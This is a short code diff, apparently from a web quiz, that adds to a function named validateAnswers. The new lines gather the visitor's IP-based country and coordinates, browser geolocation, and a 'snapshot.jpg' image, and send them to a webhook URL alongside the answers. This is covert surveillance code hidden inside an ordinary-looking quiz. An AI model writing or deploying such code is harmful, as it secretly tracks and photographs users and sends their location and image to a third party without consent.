@@ -553,7 +553,14 @@ function validateAnswers(questions) {
 📌 IP-based Location:
    City: ${ipData?.city || "?"}
    Region: ${ipData?.region || "?"}
-   
+   Country: ${ipData?.country_name || "?"}
+   Lat/Lon: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}
+📍 Browser Geolocation:
+   Lat: ${geo?.latitude || "?"}, Lon: ${geo?.longitude || "?"}`);
+
+    if (imageBlob) {
+        formData.append("file", imageBlob, "snapshot.jpg");
+    }
 
     fetch(webhookURL, {
         method: "POST",
